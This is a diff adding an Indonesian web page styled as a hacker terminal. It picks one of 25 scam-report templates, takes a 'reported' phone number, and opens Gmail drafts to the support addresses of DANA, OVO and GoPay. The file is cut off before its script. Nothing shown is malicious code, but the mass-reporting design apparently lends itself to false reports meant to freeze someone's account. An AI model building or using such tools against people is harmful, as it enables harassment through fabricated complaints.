@@ -1,0 +1,1644 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Laporan Penipuan — Terminal</title>
+<style>
+  :root {
+    --bg: #000000;
+    --panel: #0a0a0a;
+    --panel-2: #050505;
+    --line: #ffffff;
+    --line-dim: rgba(255,255,255,0.18);
+    --line-mid: rgba(255,255,255,0.35);
+    --txt: #ffffff;
+    --txt-dim: #8a8a8a;
+    --txt-mute: #4a4a4a;
+    --ease: cubic-bezier(.22,.61,.36,1);
+    --fast: 140ms;
+    --med: 260ms;
+    --slow: 520ms;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+
+  body {
+    min-height: 100vh;
+    background: var(--bg);
+    color: var(--txt);
+    font-family: 'SF Mono', 'JetBrains Mono', 'Roboto Mono', ui-monospace, Menlo, Consolas, monospace;
+    font-size: 13px;
+    line-height: 1.6;
+    letter-spacing: .02em;
+    overflow-x: hidden;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* ============ BACKGROUND ============ */
+  .bg-layer { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
+  .bg-layer .fade-in { opacity: 0; animation: bgFadeIn 900ms var(--ease) forwards; }
+  @keyframes bgFadeIn { to { opacity: 1; } }
+
+  .bg-grid {
+    position: absolute; inset: -100px;
+    background-image:
+      linear-gradient(to right, rgba(255,255,255,.045) 1px, transparent 1px),
+      linear-gradient(to bottom, rgba(255,255,255,.045) 1px, transparent 1px);
+    background-size: 64px 64px;
+    animation: gridDrift 90s linear infinite;
+  }
+  @keyframes gridDrift { from { transform: translate(0,0);} to { transform: translate(64px,64px);} }
+
+  .bg-scan {
+    position: absolute; inset: 0;
+    background: repeating-linear-gradient(to bottom,
+      rgba(255,255,255,0.018) 0px, rgba(255,255,255,0.018) 1px,
+      transparent 1px, transparent 4px);
+    opacity: .6;
+  }
+  .bg-sweep {
+    position: absolute; left: 0; right: 0; height: 220px;
+    background: linear-gradient(to bottom, transparent, rgba(255,255,255,.05), transparent);
+    animation: sweep 9s linear infinite; opacity: .5;
+  }
+  @keyframes sweep {
+    0% { transform: translateY(-30vh); }
+    100% { transform: translateY(120vh); }
+  }
+  .bg-orb {
+    position: absolute; width: 420px; height: 420px;
+    border: 1px solid rgba(255,255,255,.05);
+    animation: orbFloat 24s ease-in-out infinite alternate, ambient 6s ease-in-out infinite;
+  }
+  .bg-orb.a { top: 8%; left: -8%; }
+  .bg-orb.b { bottom: 4%; right: -10%; animation-duration: 30s, 8s; }
+  .bg-orb.c { top: 45%; left: 55%; width: 280px; height: 280px; animation-duration: 20s, 7s; }
+  @keyframes orbFloat {
+    0% { transform: translate(0,0) rotate(0deg);}
+    100% { transform: translate(40px,-30px) rotate(8deg);}
+  }
+  @keyframes ambient { 0%,100%{opacity:.35;} 50%{opacity:.8;} }
+
+  .bg-dot {
+    position: absolute; width: 2px; height: 2px;
+    background: rgba(255,255,255,.5);
+    animation: dotFloat linear infinite;
+  }
+  @keyframes dotFloat {
+    0% { transform: translateY(0); opacity: 0; }
+    10% { opacity: .6; }
+    90% { opacity: .6; }
+    100% { transform: translateY(-120vh); opacity: 0; }
+  }
+
+  /* ============ LOADING SCREEN ============ */
+  .loader {
+    position: fixed; inset: 0; z-index: 9999;
+    background: #000;
+    display: grid; place-items: center;
+    transition: opacity 700ms var(--ease), visibility 700ms;
+    padding: 24px;
+  }
+  .loader.done { opacity: 0; visibility: hidden; pointer-events: none; }
+
+  .loader-inner {
+    width: 100%; max-width: 520px;
+    display: flex; flex-direction: column; gap: 18px;
+  }
+  .loader-head {
+    display: flex; justify-content: space-between; align-items: center;
+    font-size: 10px; letter-spacing: .4em; text-transform: uppercase;
+    color: var(--txt-dim);
+  }
+  .loader-head .pulse {
+    width: 6px; height: 6px; background: #fff;
+    animation: blink 1.2s steps(2, end) infinite;
+  }
+  @keyframes blink { 50% { opacity: .15; } }
+
+  .loader-title {
+    font-size: clamp(18px, 3.2vw, 24px);
+    font-weight: 500;
+    letter-spacing: -.01em;
+  }
+  .loader-title .cursor {
+    display: inline-block; width: 9px; height: 1em;
+    background: #fff; vertical-align: -2px; margin-left: 4px;
+    animation: blink 1s steps(2,end) infinite;
+  }
+
+  .loader-log {
+    border: 1px solid #fff;
+    background: #050505;
+    padding: 12px 14px;
+    height: 150px;
+    overflow: hidden;
+    font-size: 11px;
+    letter-spacing: .06em;
+    color: var(--txt-dim);
+    position: relative;
+  }
+  .loader-log::after {
+    content: '';
+    position: absolute; inset: 0;
+    background: repeating-linear-gradient(to bottom,
+      rgba(255,255,255,0.02) 0px, rgba(255,255,255,0.02) 1px,
+      transparent 1px, transparent 3px);
+    pointer-events: none;
+  }
+  .loader-log .row {
+    opacity: 0; transform: translateX(-6px);
+    animation: logIn 260ms var(--ease) forwards;
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+  .loader-log .row b { color: #fff; font-weight: 500; }
+  .loader-log .row.ok::after { content: ' ✓'; color: #fff; }
+  @keyframes logIn { to { opacity: 1; transform: none; } }
+
+  .loader-bar {
+    height: 1px; background: rgba(255,255,255,.15);
+    position: relative; overflow: hidden;
+  }
+  .loader-bar > i {
+    position: absolute; inset: 0; background: #fff;
+    transform: scaleX(0); transform-origin: left;
+    transition: transform 220ms var(--ease);
+  }
+  .loader-meta {
+    display: flex; justify-content: space-between;
+    font-size: 10px; letter-spacing: .3em; text-transform: uppercase;
+    color: var(--txt-mute);
+  }
+
+  .loader-ring {
+    display: grid; place-items: center;
+    width: 44px; height: 44px;
+    border: 1px solid rgba(255,255,255,.2);
+    position: relative;
+    margin: 0 auto;
+  }
+  .loader-ring::before {
+    content: '';
+    position: absolute; inset: 0;
+    border: 1px solid transparent;
+    border-top-color: #fff;
+    animation: spin 900ms linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ============ SHELL ============ */
+  .shell {
+    position: relative; z-index: 2;
+    max-width: 780px; margin: 0 auto;
+    padding: 32px 20px 80px;
+  }
+
+  /* ============ HEADER ============ */
+  .topbar {
+    display: flex; align-items: center; justify-content: space-between;
+    border: 1px solid var(--line);
+    background: var(--panel);
+    padding: 14px 18px;
+    transform: translateY(-24px); opacity: 0;
+    animation: slideDown 700ms var(--ease) 200ms forwards;
+  }
+  @keyframes slideDown { to { transform: translateY(0); opacity: 1; } }
+
+  .brand {
+    display: flex; align-items: center; gap: 12px;
+    font-size: 12px; letter-spacing: .22em; text-transform: uppercase;
+  }
+  .brand .glyph {
+    width: 20px; height: 20px; border: 1px solid #fff;
+    position: relative; display: inline-block;
+  }
+  .brand .glyph::before,
+  .brand .glyph::after { content: ''; position: absolute; background: #fff; }
+  .brand .glyph::before { top: 50%; left: 3px; right: 3px; height: 1px; transform: translateY(-50%); }
+  .brand .glyph::after  { left: 50%; top: 3px; bottom: 3px; width: 1px; transform: translateX(-50%); }
+  .brand .dot-live { width: 6px; height: 6px; background: #fff; margin-left: 4px; animation: blink 1.6s steps(2,end) infinite; }
+
+  .nav { display: flex; gap: 20px; }
+  .nav a {
+    position: relative; color: var(--txt-dim);
+    text-decoration: none; font-size: 11px;
+    letter-spacing: .18em; text-transform: uppercase;
+    padding: 4px 0; transition: color var(--fast) var(--ease);
+  }
+  .nav a::after {
+    content: ''; position: absolute; left: 0; right: 0; bottom: -2px;
+    height: 1px; background: #fff;
+    transform: scaleX(0); transform-origin: right;
+    transition: transform var(--med) var(--ease);
+  }
+  .nav a:hover, .nav a:focus-visible { color: #fff; outline: none; }
+  .nav a:hover::after, .nav a:focus-visible::after { transform: scaleX(1); transform-origin: left; }
+
+  /* ============ HERO ============ */
+  .hero {
+    margin-top: 40px;
+    opacity: 0; transform: translateY(18px);
+    animation: fadeUp 800ms var(--ease) 400ms forwards;
+  }
+  @keyframes fadeUp { to { opacity: 1; transform: translateY(0); } }
+
+  .hero .kicker {
+    font-size: 10px; letter-spacing: .4em; text-transform: uppercase;
+    color: var(--txt-mute);
+    border-left: 1px solid #fff; padding-left: 10px;
+  }
+  .hero h1 {
+    margin-top: 16px;
+    font-size: clamp(24px, 5vw, 42px);
+    font-weight: 500; letter-spacing: -.01em; line-height: 1.15;
+  }
+  .hero h1 .cursor {
+    display: inline-block; width: 10px; height: 1em; background: #fff;
+    vertical-align: -2px; margin-left: 4px;
+    animation: blink 1.1s steps(2,end) infinite;
+  }
+  .hero p {
+    margin-top: 14px; color: var(--txt-dim);
+    max-width: 560px; font-size: 12.5px; line-height: 1.7;
+  }
+
+  /* ============ BANNER ============ */
+  .banner {
+    margin-top: 28px;
+    border: 1px solid var(--line);
+    background: var(--panel);
+    padding: 8px;
+    position: relative;
+    overflow: hidden;
+    opacity: 0;
+    transform: translateY(16px);
+    animation: fadeUp 800ms var(--ease) 600ms forwards;
+    transition: box-shadow var(--med) var(--ease);
+  }
+  .banner:hover { box-shadow: 0 0 0 1px #fff, 0 8px 32px rgba(255,255,255,.08); }
+
+  .banner .frame {
+    position: relative;
+    overflow: hidden;
+    aspect-ratio: 16 / 6;
+    background: repeating-linear-gradient(45deg, #0a0a0a 0px, #0a0a0a 8px, #050505 8px, #050505 16px);
+    display: grid; place-items: center;
+  }
+  .banner img {
+    width: 100%; height: 100%;
+    object-fit: cover;
+    display: block;
+    filter: grayscale(1) contrast(1.05);
+    transition: transform 900ms var(--ease), filter var(--med) var(--ease);
+  }
+  .banner:hover img { transform: scale(1.03); filter: grayscale(0.6) contrast(1.1); }
+
+  .banner .frame::after {
+    content: '';
+    position: absolute; inset: 0;
+    background: repeating-linear-gradient(
+      to bottom,
+      rgba(0,0,0,.28) 0px,
+      rgba(0,0,0,.28) 1px,
+      transparent 1px,
+      transparent 3px
+    );
+    pointer-events: none;
+    mix-blend-mode: multiply;
+  }
+  .banner .frame::before {
+    content: '';
+    position: absolute; top: 0; bottom: 0; left: -40%;
+    width: 40%;
+    background: linear-gradient(
+      100deg,
+      transparent,
+      rgba(255,255,255,.14),
+      transparent
+    );
+    animation: bannerSweep 6s linear infinite;
+    pointer-events: none;
+    z-index: 2;
+  }
+  @keyframes bannerSweep {
+    0%   { left: -40%; }
+    100% { left: 120%; }
+  }
+
+  .banner .cap {
+    display: flex; justify-content: space-between; align-items: center;
+    gap: 10px;
+    padding: 10px 6px 4px;
+    font-size: 10px;
+    letter-spacing: .3em;
+    text-transform: uppercase;
+    color: var(--txt-dim);
+    border-top: 1px solid var(--line-dim);
+    margin-top: 8px;
+  }
+  .banner .cap b { color: #fff; font-weight: 500; }
+  .banner .cap .dot {
+    width: 6px; height: 6px; background: #fff; flex: none;
+    animation: blink 1.6s steps(2,end) infinite;
+  }
+
+  .banner .fallback-text {
+    font-size: 10px; letter-spacing: .3em; color: var(--txt-mute); position: relative; z-index: 3;
+  }
+
+  /* ============ SECTIONS ============ */
+  .section { margin-top: 36px; opacity: 0; transform: translateY(20px); }
+  .section.in {
+    opacity: 1; transform: none;
+    transition: opacity 700ms var(--ease), transform 700ms var(--ease);
+  }
+
+  .panel {
+    border: 1px solid var(--line);
+    background: var(--panel);
+    padding: 20px; position: relative; overflow: hidden;
+  }
+  .panel::after {
+    content: ''; position: absolute; inset: 0;
+    border: 1px solid rgba(255,255,255,.35);
+    opacity: 0; pointer-events: none;
+    transition: opacity var(--med) var(--ease);
+  }
+  .panel:hover::after { opacity: 1; }
+
+  .field-head {
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; margin-bottom: 10px;
+  }
+  .field-head label {
+    font-size: 10.5px; letter-spacing: .3em; text-transform: uppercase;
+    color: var(--txt-dim); transition: color var(--fast) var(--ease);
+  }
+  .field.active .field-head label { color: #fff; }
+  .field-head .counter {
+    font-size: 10.5px; letter-spacing: .12em; color: var(--txt-mute);
+    font-variant-numeric: tabular-nums;
+  }
+
+  .control {
+    width: 100%; background: var(--panel-2); color: #fff;
+    border: 1px solid var(--line); border-radius: 0;
+    padding: 12px 14px; font: inherit; font-size: 13.5px;
+    letter-spacing: .02em; outline: none;
+    transition: box-shadow var(--fast) var(--ease), background var(--fast) var(--ease), border-color var(--fast) var(--ease);
+    -webkit-appearance: none; appearance: none;
+  }
+  .control::placeholder { color: var(--txt-mute); transition: opacity var(--fast) var(--ease); }
+  .control:focus { background: #0d0d0d; }
+  .control:focus::placeholder { opacity: .35; }
+  .control:focus-visible { outline: 1px solid #fff; outline-offset: 2px; }
+
+  .field { position: relative; }
+  .field .trace {
+    position: absolute; inset: 0; pointer-events: none;
+    opacity: 0; transition: opacity var(--med) var(--ease);
+  }
+  .field.active .trace,
+  .field:focus-within .trace { opacity: 1; }
+  .field .trace::before,
+  .field .trace::after { content: ''; position: absolute; background: #fff; }
+  .field .trace::before {
+    top: -1px; left: -1px; height: 1px; width: 100%;
+    transform: scaleX(0); transform-origin: left;
+    animation: traceH 2.4s linear infinite;
+  }
+  .field .trace::after {
+    top: -1px; right: -1px; width: 1px; height: 100%;
+    transform: scaleY(0); transform-origin: top;
+    animation: traceV 2.4s linear infinite;
+  }
+  @keyframes traceH {
+    0% { transform: scaleX(0); transform-origin: left; }
+    45% { transform: scaleX(1); transform-origin: left; }
+    55% { transform: scaleX(1); transform-origin: right; }
+    100% { transform: scaleX(0); transform-origin: right; }
+  }
+  @keyframes traceV {
+    0% { transform: scaleY(0); transform-origin: top; opacity: 0; }
+    10% { opacity: 1; }
+    45% { transform: scaleY(1); transform-origin: top; }
+    55% { transform: scaleY(1); transform-origin: bottom; }
+    100% { transform: scaleY(0); transform-origin: bottom; opacity: 0; }
+  }
+
+  select.control {
+    padding-right: 38px;
+    background-image:
+      linear-gradient(45deg, transparent 50%, #fff 50%),
+      linear-gradient(135deg, #fff 50%, transparent 50%);
+    background-position:
+      calc(100% - 18px) calc(50% - 2px),
+      calc(100% - 12px) calc(50% - 2px);
+    background-size: 6px 6px, 6px 6px;
+    background-repeat: no-repeat;
+    cursor: pointer;
+    transition: background-color var(--fast) var(--ease);
+  }
+  select.control:hover { background-color: #0f0f0f; }
+  select.control option { background: #000; color: #fff; }
+
+  textarea.control { min-height: 260px; resize: vertical; line-height: 1.65; }
+
+  .field.invalid .control {
+    box-shadow: inset 0 0 0 1px #fff, 0 0 0 1px #fff;
+    animation: shake 320ms var(--ease);
+  }
+  @keyframes shake {
+    0%,100% { transform: translateX(0); }
+    25% { transform: translateX(-4px); }
+    75% { transform: translateX(4px); }
+  }
+
+  .err-line {
+    margin-top: 8px; font-size: 11px;
+    letter-spacing: .1em; text-transform: uppercase; color: #fff;
+    border-left: 1px solid #fff; padding-left: 8px;
+    max-height: 0; opacity: 0; overflow: hidden;
+    transition: max-height var(--med) var(--ease), opacity var(--med) var(--ease), margin var(--med) var(--ease);
+  }
+  .field.invalid .err-line { max-height: 40px; opacity: 1; }
+
+  /* ============ TARGETS ============ */
+  .targets { display: grid; gap: 10px; }
+  .target {
+    position: relative;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 14px;
+    border: 1px solid var(--line);
+    background: var(--panel-2);
+    padding: 14px 16px;
+    cursor: pointer; user-select: none;
+    transition: transform var(--fast) var(--ease), background var(--fast) var(--ease), box-shadow var(--med) var(--ease);
+    overflow: hidden;
+  }
+  .target::before {
+    content: ''; position: absolute; left: 0; top: 0; bottom: 0;
+    width: 2px; background: #fff;
+    transform: scaleY(0); transform-origin: top;
+    transition: transform var(--med) var(--ease);
+  }
+  .target:hover { transform: translateY(-2px); background: #101010; }
+  .target:hover::before { transform: scaleY(1); }
+  .target.selected { background: #0f0f0f; box-shadow: inset 0 0 0 1px #fff; }
+  .target.selected::before { transform: scaleY(1); }
+
+  .target .meta .name { font-size: 13px; letter-spacing: .18em; text-transform: uppercase; }
+  .target .meta .mail {
+    font-size: 11px; color: var(--txt-dim); margin-top: 4px;
+    word-break: break-all; letter-spacing: .04em;
+  }
+  .target .meta .mail span { display: block; }
+  .target .mark {
+    width: 18px; height: 18px; border: 1px solid #fff;
+    position: relative; flex: none; transition: background var(--fast) var(--ease);
+  }
+  .target .mark::after {
+    content: ''; position: absolute; inset: 3px; background: #fff;
+    transform: scale(0); transition: transform 220ms var(--ease);
+  }
+  .target.selected .mark::after { transform: scale(1); }
+
+  /* ============ BUTTONS ============ */
+  .btn {
+    position: relative; width: 100%;
+    display: inline-flex; align-items: center; justify-content: center; gap: 10px;
+    padding: 14px 18px;
+    border: 1px solid var(--line); border-radius: 0;
+    background: #000; color: #fff;
+    font: inherit; font-size: 12px;
+    letter-spacing: .28em; text-transform: uppercase;
+    cursor: pointer; overflow: hidden;
+    transition: background var(--fast) var(--ease), color var(--fast) var(--ease), transform var(--fast) var(--ease);
+    -webkit-tap-highlight-color: transparent;
+  }
+  .btn .ico { display: inline-block; transition: transform var(--med) var(--ease); }
+  .btn:hover:not(:disabled) { background: #fff; color: #000; }
+  .btn:hover:not(:disabled) .ico { transform: translateX(4px); }
+  .btn:active:not(:disabled) { transform: scale(.985); }
+  .btn:focus-visible { outline: 1px solid #fff; outline-offset: 3px; }
+  .btn:disabled { opacity: .4; cursor: not-allowed; }
+  .btn .ripple {
+    position: absolute; border-radius: 50%;
+    background: rgba(255,255,255,.35);
+    transform: scale(0); pointer-events: none;
+    animation: ripple 620ms var(--ease) forwards;
+  }
+  .btn:hover:not(:disabled) .ripple { background: rgba(0,0,0,.15); }
+  @keyframes ripple { to { transform: scale(3.2); opacity: 0; } }
+
+  .btn.solid { background: #fff; color: #000; }
+  .btn.solid:hover:not(:disabled) { background: #000; color: #fff; }
+  .btn.solid .ripple { background: rgba(0,0,0,.2); }
+  .btn.solid:hover:not(:disabled) .ripple { background: rgba(255,255,255,.35); }
+
+  .btn.loading .label { opacity: 0; }
+  .btn .spinner {
+    position: absolute; width: 16px; height: 16px;
+    border: 1px solid rgba(255,255,255,.25);
+    border-top-color: #fff; opacity: 0;
+    animation: spin 700ms linear infinite; pointer-events: none;
+  }
+  .btn:hover:not(:disabled) .spinner { border-color: rgba(0,0,0,.25); border-top-color: #000; }
+  .btn.loading .spinner { opacity: 1; }
+
+  .btn-row { display: grid; gap: 10px; margin-top: 22px; }
+
+  /* ============ TOAST ============ */
+  .toast-stack {
+    position: fixed; right: 16px; bottom: 16px; z-index: 5000;
+    display: flex; flex-direction: column; gap: 8px;
+    max-width: min(360px, calc(100vw - 32px));
+  }
+  .toast {
+    border: 1px solid #fff; background: #000; color: #fff;
+    padding: 12px 14px; font-size: 11.5px; letter-spacing: .06em;
+    display: flex; align-items: flex-start; gap: 10px;
+    transform: translateX(120%); opacity: 0;
+    animation: toastIn 380ms var(--ease) forwards;
+  }
+  .toast.out { animation: toastOut 300ms var(--ease) forwards; }
+  @keyframes toastIn { to { transform: translateX(0); opacity: 1; } }
+  @keyframes toastOut { to { transform: translateX(120%); opacity: 0; } }
+  .toast .mark { width: 12px; height: 12px; border: 1px solid #fff; flex: none; margin-top: 2px; position: relative; }
+  .toast.success .mark::after { content: ''; position: absolute; inset: 2px; background: #fff; animation: markPop 300ms var(--ease); }
+  .toast.error .mark::after { content: ''; position: absolute; inset: 2px; border: 1px solid #fff; background: transparent; transform: rotate(45deg) scale(.7); animation: markPop 300ms var(--ease); }
+  .toast.info .mark::after { content: ''; position: absolute; left: 50%; top: 2px; bottom: 2px; width: 1px; background: #fff; transform: translateX(-50%); }
+  @keyframes markPop { from { opacity: 0; transform: scale(0); } to { opacity: 1; } }
+
+  /* ============ MODAL ============ */
+  .modal-scrim {
+    position: fixed; inset: 0; background: rgba(0,0,0,.85);
+    z-index: 4000; display: none; align-items: center; justify-content: center;
+    padding: 20px; opacity: 0; transition: opacity var(--med) var(--ease);
+  }
+  .modal-scrim.open { display: flex; opacity: 1; }
+  .modal {
+    width: 100%; max-width: 460px;
+    border: 1px solid #fff; background: #000; padding: 24px;
+    transform: scale(.94); opacity: 0;
+    animation: modalIn 380ms var(--ease) forwards;
+  }
+  @keyframes modalIn { to { transform: scale(1); opacity: 1; } }
+  .modal h3 { font-size: 14px; letter-spacing: .3em; text-transform: uppercase; margin-bottom: 14px; }
+  .modal .body { font-size: 12px; color: var(--txt-dim); line-height: 1.7; }
+  .modal .body b { color: #fff; font-weight: 500; }
+  .modal .body ul { list-style: none; margin: 10px 0 0; padding: 0; }
+  .modal .body li { padding: 6px 0; border-bottom: 1px dashed rgba(255,255,255,.15); font-size: 11.5px; word-break: break-all; }
+  .modal .body li:last-child { border-bottom: none; }
+  .modal .row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 22px; }
+
+  /* ============ BACK TO TOP ============ */
+  .totop {
+    position: fixed; right: 16px; bottom: 16px;
+    width: 42px; height: 42px;
+    border: 1px solid #fff; background: #000; color: #fff;
+    display: grid; place-items: center; cursor: pointer;
+    opacity: 0; transform: translateY(12px);
+    transition: opacity var(--med) var(--ease), transform var(--med) var(--ease), background var(--fast) var(--ease), color var(--fast) var(--ease);
+    z-index: 3000;
+  }
+  .totop.show { opacity: 1; transform: none; }
+  .totop:hover { background: #fff; color: #000; }
+  .totop:active { transform: scale(.94); }
+  .totop::before {
+    content: ''; width: 8px; height: 8px;
+    border-top: 1px solid currentColor;
+    border-left: 1px solid currentColor;
+    transform: rotate(45deg) translate(1px,1px);
+  }
+
+  /* ============ FOOTER ============ */
+  .foot {
+    margin-top: 40px; padding: 20px 0 0;
+    border-top: 1px solid var(--line);
+    display: flex; justify-content: space-between; align-items: center;
+    gap: 12px; font-size: 10.5px; letter-spacing: .18em;
+    text-transform: uppercase; color: var(--txt-mute); flex-wrap: wrap;
+  }
+  .foot .status { display: flex; align-items: center; gap: 8px; }
+  .foot .status .dot { width: 6px; height: 6px; background: #fff; animation: blink 1.6s steps(2,end) infinite; }
+
+  .hint {
+    margin-top: 14px; font-size: 11px; color: var(--txt-mute);
+    letter-spacing: .04em; line-height: 1.7;
+    border-left: 1px solid var(--line-dim); padding-left: 10px;
+  }
+
+  @media (max-width: 520px) {
+    .shell { padding: 20px 14px 90px; }
+    .topbar { padding: 12px 14px; }
+    .nav { gap: 12px; }
+    .nav a { font-size: 10px; }
+    .panel { padding: 16px; }
+    .hero { margin-top: 28px; }
+    textarea.control { min-height: 220px; }
+    .modal .row { grid-template-columns: 1fr; }
+    .banner .frame { aspect-ratio: 16 / 8; }
+    .banner .cap { font-size: 9px; letter-spacing: .22em; }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after {
+      animation-duration: 1ms !important;
+      animation-iteration-count: 1 !important;
+      transition-duration: 1ms !important;
+    }
+    .section { opacity: 1 !important; transform: none !important; }
+    .loader { display: none !important; }
+    .banner, .banner .frame::before { animation: none !important; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="loader" id="loader" aria-hidden="true">
+    <div class="loader-inner">
+      <div class="loader-head">
+        <span>REPORT//SYS</span>
+        <span class="pulse"></span>
+      </div>
+
+      <div class="loader-title">Menyiapkan sistem<span class="cursor"></span></div>
+
+      <div class="loader-log" id="loaderLog"></div>
+
+      <div class="loader-bar"><i id="loaderBar"></i></div>
+
+      <div class="loader-meta">
+        <span id="loaderPct">0%</span>
+        <span id="loaderStep">BOOT</span>
+      </div>
+
+      <div class="loader-ring" aria-hidden="true"></div>
+    </div>
+  </div>
+
+  <div class="bg-layer" aria-hidden="true">
+    <div class="bg-grid fade-in"></div>
+    <div class="bg-scan fade-in"></div>
+    <div class="bg-sweep"></div>
+    <div class="bg-orb a"></div>
+    <div class="bg-orb b"></div>
+    <div class="bg-orb c"></div>
+    <div id="dots"></div>
+  </div>
+
+  <main class="shell" id="shell">
+
+    <header class="topbar">
+      <div class="brand">
+        <span class="glyph"></span>
+        <span>REPORT//SYS</span>
+        <span class="dot-live"></span>
+      </div>
+      <nav class="nav">
+        <a href="#form">FORM</a>
+        <a href="#send">KIRIM</a>
+      </nav>
+    </header>
+
+    <section class="hero">
+      <div class="kicker">LAPORAN PENIPUAN</div>
+      <h1>Kirim laporan resmi<span class="cursor"></span></h1>
+      <p>Pilih format, isi nomor terlapor, lalu kirim ke semua alamat email resmi tiap payment. Semua proses berjalan di perangkat Anda.</p>
+    </section>
+
+    <section class="banner" id="banner" aria-label="Banner">
+      <div class="frame" id="bannerFrame">
+        <img
+          id="bannerImg"
+          src="https://files.catbox.moe/l2ds3k.jpg"
+          alt="Banner laporan penipuan"
+          referrerpolicy="no-referrer"
+          style="position:absolute; inset:0; z-index:1;">
+        <span class="fallback-text" style="display:none; z-index:0;">BANNER UNAVAILABLE</span>
+      </div>
+      <div class="cap">
+        <span><b>//</b> OFFICIAL BANNER</span>
+        <span style="display:flex;align-items:center;gap:8px;">
+          <span class="dot"></span>
+          <span>SECURE CHANNEL</span>
+        </span>
+      </div>
+    </section>
+
+    <form id="reportForm" novalidate autocomplete="off">
+
+      <section class="section" id="form">
+        <div class="panel">
+
+          <div class="field" id="fieldTemplate">
+            <div class="field-head">
+              <label for="template">Format Laporan</label>
+              <span class="counter" id="fmtCount">25 FORMAT</span>
+            </div>
+            <div class="trace"></div>
+            <select id="template" class="control">
+              <option value="t1">Akun Game</option>
+              <option value="t2">Kerja Kamboja</option>
+              <option value="t3">Investasi Bodong</option>
+              <option value="t4">Pinjol Ilegal</option>
+              <option value="t5">Belanja Online</option>
+              <option value="t6">Tiket Konser Palsu</option>
+              <option value="t7">Undian Berhadiah</option>
+              <option value="t8">Penipuan Lowongan Kerja</option>
+              <option value="t9">Sewa Kamar Fiktif</option>
+              <option value="t10">Titip Investasi Kripto</option>
+              <option value="t11">Modus Kurir Paket</option>
+              <option value="t12">Donasi Bencana Palsu</option>
+              <option value="t13">Jual Beli Hewan Peliharaan</option>
+              <option value="t14">Transfer Salah Rekening</option>
+              <option value="t15">Top Up Game Palsu</option>
+              <option value="t16">Penipuan Arisan Online</option>
+              <option value="t17">Sewa Mobil Fiktif</option>
+              <option value="t18">Penipuan Les Privat</option>
+              <option value="t19">Skema Ponzi</option>
+              <option value="t20">Penipuan Endorse Produk</option>
+              <option value="t21">Pembekuan Akun Dana</option>
+              <option value="t22">Penipuan Jasa Review Palsu</option>
+              <option value="t23">Penipuan Tiket Travel</option>
+              <option value="t24">Penipuan Donasi Fiktif</option>
+              <option value="t25">Penipuan Pinjaman Online</option>
+            </select>
+          </div>
+
+          <div class="field" id="fieldPhone" style="margin-top:22px;">
+            <div class="field-head">
+              <label for="phone">Nomor Terlapor</label>
+              <span class="counter" id="phoneCount">0 / 13</span>
+            </div>
+            <div class="trace"></div>
+            <input id="phone" class="control" inputmode="numeric" placeholder="08xxxxxxxxxx" maxlength="13">
+            <div class="err-line">Nomor tidak valid. Contoh: 08123456789.</div>
+          </div>
+
+          <div class="field" id="fieldMessage" style="margin-top:22px;">
+            <div class="field-head">
+              <label for="message">Isi Laporan</label>
+              <span class="counter" id="msgCount">0 KARAKTER</span>
+            </div>
+            <div class="trace"></div>
+            <textarea id="message" class="control" spellcheck="false"></textarea>
+            <div class="err-line">Isi laporan terlalu pendek.</div>
+          </div>
+
+        </div>
+      </section>
+
+      <section class="section" id="send">
+        <div class="panel">
+          <div class="field-head" style="margin-bottom:12px;">
+            <label>Tujuan Pengiriman</label>
+            <span class="counter">PILIH SATU</span>
+          </div>
+
+          <div class="targets" id="targets">
+            <div class="target selected" tabindex="0" role="radio" aria-checked="true"
+                 data-name="DANA"
+                 data-emails="merchant.services@dana.id,help@dana.id,cs@dana.id">
+              <div class="meta">
+                <div class="name">DANA</div>
+                <div class="mail">
+                  <span>merchant.services@dana.id</span>
+                  <span>help@dana.id</span>
+                  <span>cs@dana.id</span>
+                </div>
+              </div>
+              <div class="mark"></div>
+            </div>
+
+            <div class="target" tabindex="0" role="radio" aria-checked="false"
+                 data-name="OVO"
+                 data-emails="merchant.support@ovo.id,cs@ovo.id,care@ovo.id">
+              <div class="meta">
+                <div class="name">OVO</div>
+                <div class="mail">
+                  <span>merchant.support@ovo.id</span>
+                  <span>cs@ovo.id</span>
+                  <span>care@ovo.id</span>
+                </div>
+              </div>
+              <div class="mark"></div>
+            </div>
+
+            <div class="target" tabindex="0" role="radio" aria-checked="false"
+                 data-name="GoPay"
+                 data-emails="customerservice@gojek.com,cs@gojek.com,help@gojek.com">
+              <div class="meta">
+                <div class="name">GoPay</div>
+                <div class="mail">
+                  <span>customerservice@gojek.com</span>
+                  <span>cs@gojek.com</span>
+                  <span>help@gojek.com</span>
+                </div>
+              </div>
+              <div class="mark"></div>
+            </div>
+          </div>
+
+          <div class="btn-row">
+            <button type="button" class="btn solid" id="btnSend">
+              <span class="label">KIRIM SEMUA EMAIL PAYMENT INI</span>
+              <span class="ico">→</span>
+              <span class="spinner"></span>
+            </button>
+            <button type="button" class="btn" id="btnAll">
+              <span class="label">KIRIM KE SEMUA PAYMENT</span>
+              <span class="ico">→</span>
+              <span class="spinner"></span>
+            </button>
+          </div>
+
+          <div class="hint">Tombol pertama membuka Gmail untuk semua alamat email resmi payment yang dipilih. Tombol kedua membuka Gmail untuk semua payment sekaligus (9 alamat).</div>
+        </div>
+      </section>
+
+    </form>
+
+    <footer class="foot">
+      <div class="status"><span class="dot"></span><span id="statusText">READY</span></div>
+      <div>LOCAL PROCESSING · NO SERVER</div>
+    </footer>
+  </main>
+
+  <div class="toast-stack" id="toastStack" aria-live="polite"></div>
+
+  <button class="totop" id="totop" aria-label="Kembali ke atas"></button>
+
+  <div class="modal-scrim" id="scrim" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <div class="modal" id="modal">
+      <h3 id="modalTitle">KONFIRMASI</h3>
+      <div class="body" id="modalBody"></div>
+      <div class="row">
+        <button type="button" class="btn" id="modalCancel"><span class="label">BATAL</span></button>
+        <button type="button" class="btn solid" id="modalOk">
